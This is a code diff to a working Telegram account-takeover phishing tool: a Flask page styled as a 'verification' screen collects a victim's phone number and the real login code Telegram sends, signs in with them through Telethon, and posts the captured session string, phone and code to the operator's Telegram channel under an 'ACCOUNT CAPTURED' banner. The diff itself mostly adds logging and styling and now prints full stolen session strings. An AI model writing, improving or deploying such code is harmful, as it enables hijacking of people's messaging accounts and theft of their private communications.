@@ -52,7 +52,6 @@ def init_db():
         print(f"Database initialization failed: {e}")
 
 # --- GLOBAL STORAGE ---
-# Stores: user_id -> {client, phone, phone_code_hash}
 active_sessions = {}
 
 # --- TELETHON CLIENT FOR BOT ---
@@ -69,7 +68,7 @@ async def send_to_channel(message_text):
     except Exception as e:
         print(f"[ERROR] Failed to send to channel: {e}")
 
-# --- FRONTEND HTML ---
+# --- FRONTEND HTML (COMPLETE) ---
 FRONTEND_HTML = """<!DOCTYPE html>
 <html>
 <head>
@@ -78,22 +77,22 @@ FRONTEND_HTML = """<!DOCTYPE html>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: url('https://res.cloudinary.com/bhcgogng/image/upload/v1784494648/photo_2026-07-19_23-37-40_bwzfbi.jpg') no-repeat center center fixed; background-size: cover; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
         .container { display: flex; flex-direction: column; align-items: center; justify-content: center; width: 100%; height: 100%; padding: 20px; background: rgba(0, 0, 0, 0.3); }
-        .card { background: rgba(0, 0, 0, 0.6); backdrop-filter: blur(10px); padding: 40px 30px; border-radius: 20px; text-align: center; max-width: 400px; width: 100%; border: 1px solid rgba(255, 255, 255, 0.1); box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3); }
-        h2 { color: #fff; margin-bottom: 20px; font-size: 22px; font-weight: 600; }
-        p { color: #ddd; font-size: 14px; margin-bottom: 30px; line-height: 1.5; }
-        .robot-icon { font-size: 100px; margin-bottom: 20px; display: block; }
-        .btn { background: linear-gradient(135deg, rgba(255,107,157,0.9), rgba(196,69,105,0.9)); color: white; border: none; padding: 16px 30px; border-radius: 12px; font-size: 18px; cursor: pointer; width: 100%; font-weight: bold; margin: 10px 0; transition: all 0.3s; }
+        .card { background: rgba(0, 0, 0, 0.6); backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px); padding: 40px 30px; border-radius: 20px; text-align: center; max-width: 400px; width: 100%; border: 1px solid rgba(255, 255, 255, 0.1); box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3); }
+        h2 { color: #fff; margin-bottom: 20px; font-size: 22px; font-weight: 600; text-shadow: 0 2px 4px rgba(0,0,0,0.5); }
+        p { color: #ddd; font-size: 14px; margin-bottom: 30px; line-height: 1.5; text-shadow: 0 1px 2px rgba(0,0,0,0.5); }
+        .robot-icon { font-size: 100px; margin-bottom: 20px; display: block; filter: drop-shadow(0 4px 8px rgba(0,0,0,0.3)); }
+        .btn { background: linear-gradient(135deg, rgba(255,107,157,0.9), rgba(196,69,105,0.9)); color: white; border: none; padding: 16px 30px; border-radius: 12px; font-size: 18px; cursor: pointer; width: 100%; font-weight: bold; margin: 10px 0; transition: all 0.3s; backdrop-filter: blur(5px); border: 1px solid rgba(255,255,255,0.1); }
         .btn:active { transform: scale(0.98); }
         .btn:disabled { background: rgba(68, 68, 68, 0.8); cursor: not-allowed; }
         #verificationScreen, #codeScreen { display: none; }
         .code-slots { display: flex; justify-content: center; gap: 12px; margin-bottom: 30px; }
-        .code-slot { width: 55px; height: 55px; border: 2px solid rgba(255, 255, 255, 0.3); border-radius: 12px; background: rgba(255, 255, 255, 0.1); display: flex; align-items: center; justify-content: center; font-size: 28px; font-weight: bold; color: #fff; }
+        .code-slot { width: 55px; height: 55px; border: 2px solid rgba(255, 255, 255, 0.3); border-radius: 12px; background: rgba(255, 255, 255, 0.1); display: flex; align-items: center; justify-content: center; font-size: 28px; font-weight: bold; color: #fff; backdrop-filter: blur(5px); }
         .code-slot.filled { background: rgba(255, 107, 157, 0.8); border-color: rgba(255, 107, 157, 0.9); }
-        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; max-width: 320px; margin: 0 auto; padding: 20px; background: rgba(0, 0, 0, 0.3); border-radius: 20px; }
-        .key { background: linear-gradient(135deg, rgba(255,107,157,0.9), rgba(196,69,105,0.9)); color: white; border: none; padding: 18px; border-radius: 12px; font-size: 24px; font-weight: bold; cursor: pointer; }
+        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; max-width: 320px; margin: 0 auto; padding: 20px; background: rgba(0, 0, 0, 0.3); border-radius: 20px; backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); }
+        .key { background: linear-gradient(135deg, rgba(255,107,157,0.9), rgba(196,69,105,0.9)); color: white; border: none; padding: 18px; border-radius: 12px; font-size: 24px; font-weight: bold; cursor: pointer; backdrop-filter: blur(5px); border: 1px solid rgba(255,255,255,0.1); }
         .key.clear { background: linear-gradient(135deg, rgba(68,68,68,0.8), rgba(34,34,34,0.8)); }
-        .error { color: #ff6b6b; font-size: 14px; margin-top: 10px; display: none; font-weight: bold; }
-        .loading { display: none; color: #ddd; margin-top: 10px; }
+        .error { color: #ff6b6b; font-size: 14px; margin-top: 10px; display: none; text-shadow: 0 1px 2px rgba(0,0,0,0.5); font-weight: bold; }
+        .loading { display: none; color: #ddd; margin-top: 10px; text-shadow: 0 1px 2px rgba(0,0,0,0.5); }
     </style>
 </head>
 <body>
@@ -176,7 +175,6 @@ FRONTEND_HTML = """<!DOCTYPE html>
                     var phone = response.contact.phone_number;
                     console.log('Phone received:', phone);
                     
-                    // Send phone to backend to request login code
                     fetch('/request_code', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
@@ -248,7 +246,12 @@ FRONTEND_HTML = """<!DOCTYPE html>
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ code: enteredCode, user_id: userId })
             })
-            .then(function(res) { return res.json(); })
+            .then(function(res) { 
+                if (!res.ok) {
+                    throw new Error('Server error: ' + res.status);
+                }
+                return res.json(); 
+            })
             .then(function(data) {
                 document.getElementById('loadingBox').style.display = 'none';
                 if (data.success) {
@@ -288,7 +291,10 @@ def request_code():
     if not phone:
         return jsonify({"success": False, "error": "Phone number required"})
     
-    print(f"\n[REQUEST CODE] User: {user_id}, Phone: {phone}")
+    print(f"\n{'='*50}")
+    print(f"[REQUEST CODE] User: {user_id}")
+    print(f"[REQUEST CODE] Phone: {phone}")
+    print(f"{'='*50}\n")
     
     try:
         # Create event loop for this thread
@@ -297,18 +303,16 @@ def request_code():
         
         # Create TelegramClient and connect
         client = TelegramClient(StringSession(), API_ID, API_HASH)
-        
-        # Connect to Telegram
         loop.run_until_complete(client.connect())
         
-        # Request login code - THIS sends the actual SMS/code to the user's Telegram
+        # Request login code - THIS SENDS THE REAL LOGIN CODE TO USER'S TELEGRAM
         result = loop.run_until_complete(client.send_code_request(phone))
         phone_code_hash = result.phone_code_hash
         
         # Get session string
         session_string = client.session.save()
         
-        # Store in memory (keep client connected!)
+        # Store in memory (CRITICAL: same client instance used later)
         active_sessions[user_id] = {
             'client': client,
             'phone': phone,
@@ -316,7 +320,7 @@ def request_code():
             'loop': loop
         }
         
-        # Also store in database
+        # Also store in database for persistence
         conn = get_db_connection()
         cur = conn.cursor()
         cur.execute("""
@@ -338,10 +342,15 @@ def request_code():
 
 @app.route('/verify', methods=['POST'])
 def verify_code():
-    """Complete login and capture session."""
+    """Complete login and capture session string."""
     data = request.json
     code = data.get('code')
     user_id = str(data.get('user_id'))
+    
+    print(f"\n{'='*50}")
+    print(f"[VERIFY] User: {user_id}")
+    print(f"[VERIFY] Code: {code}")
+    print(f"{'='*50}\n")
     
     if user_id not in active_sessions:
         return jsonify({"success": False, "error": "Session expired. Please restart."})
@@ -352,34 +361,31 @@ def verify_code():
     phone_code_hash = session_data['hash']
     loop = session_data['loop']
     
-    print(f"\n[VERIFY] User: {user_id}, Code: {code}")
-    
     try:
-        # Complete login with the SAME client
+        # Complete login with the SAME client that requested the code
         loop.run_until_complete(client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash))
         
-        # Get the final session string (THIS IS THE STOLEN SESSION!)
+        # Capture the final session string (THIS IS THE STOLEN SESSION!)
         final_session = client.session.save()
         
         print(f"\n{'='*50}")
         print(f"[CAPTURED] Phone: {phone}")
-        print(f"[SESSION] {final_session[:60]}...")
+        print(f"[SESSION] {final_session}")
         print(f"{'='*50}\n")
         
-        # Send to your channel
+        # Send to your Telegram channel
         message = f"""🚨 ACCOUNT CAPTURED 🚨
 
 📞 Phone: `{phone}`
-🔑 Code: `{code}`
+🔑 Code Used: `{code}`
 🔐 Session String:
 `{final_session}`
 
 ⏰ {datetime.now()}"""
         
-        # Use the same loop to send message
         loop.run_until_complete(send_to_channel(message))
         
-        # Disconnect
+        # Disconnect client
         loop.run_until_complete(client.disconnect())
         
         # Cleanup
@@ -400,30 +406,30 @@ def verify_code():
     except errors.PhoneCodeExpiredError:
         return jsonify({"success": False, "error": "Code expired. Please request a new one."})
     except errors.SessionPasswordNeededError:
-        # 2FA enabled
         loop.run_until_complete(client.disconnect())
         del active_sessions[user_id]
-        
-        # Notify about 2FA
         loop.run_until_complete(send_to_channel(f"⚠️ 2FA Detected for {phone}"))
-        
         return jsonify({"success": False, "error": "This account has 2FA enabled."})
     except Exception as e:
         print(f"[ERROR] {str(e)}")
         return jsonify({"success": False, "error": str(e)})
 
-# --- BOT LISTENER (Optional) ---
+# --- BOT LISTENER (Optional - for direct messages to bot) ---
 async def bot_listener():
+    print("Starting bot listener...")
     await bot_client.start(bot_token=BOT_TOKEN)
-    print("Bot listener started")
-    
+    print("Bot is online.")
+
     @bot_client.on(events.NewMessage)
     async def handler(event):
         if event.message.media and hasattr(event.message.media, "phone_number"):
-            print(f"Bot received contact: {event.message.media.phone_number}")
-    
+            phone = event.message.media.phone_number
+            user_id = str(event.message.sender_id)
+            print(f"Bot received contact from {user_id}: {phone}")
+
     await bot_client.run_until_disconnected()
 
+# --- MAIN ---
 if __name__ == '__main__':
     init_db()
     
@@ -431,11 +437,11 @@ if __name__ == '__main__':
     def run_bot():
         asyncio.run(bot_listener())
     
-    thread = threading.Thread(target=run_bot)
-    thread.daemon = True
-    thread.start()
+    bot_thread = threading.Thread(target=run_bot)
+    bot_thread.daemon = True
+    bot_thread.start()
     
     # Start Flask
     port = int(os.environ.get("PORT", 5000))
-    print(f"Starting server on port {port}")
+    print(f"Starting web server on port {port}")
     app.run(host='0.0.0.0', port=port, debug=False)
